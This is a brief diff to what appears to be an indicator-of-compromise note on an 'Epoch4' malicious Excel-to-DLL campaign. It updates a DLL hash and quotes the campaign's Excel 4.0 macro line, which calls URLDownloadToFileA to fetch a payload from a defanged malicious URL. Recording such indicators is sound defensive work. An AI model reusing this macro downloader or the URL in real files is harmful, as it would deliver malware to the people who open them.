@@ -6,7 +6,7 @@ Epoch4 - .xls > .dll
 
 .xls 58d64a8207d56d3743dccac9c4c6dceb144f223a24a8cced22ed56af37702b53
 
-.dll fc0a5af2bc9b234898c1d228de2ed5b68f39e77c8ee53f2f02ec3ab9bfd13266
+.dll b235295c81ca8d82fad17a7924be89567b31e1849d4bc6463eb8b8c62ad02007
 
 =CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "hxxps://mastermasonsinc.com/cgi-bin/wdGQ8F9rEKhWJz/", "..\iix.ocx")
 
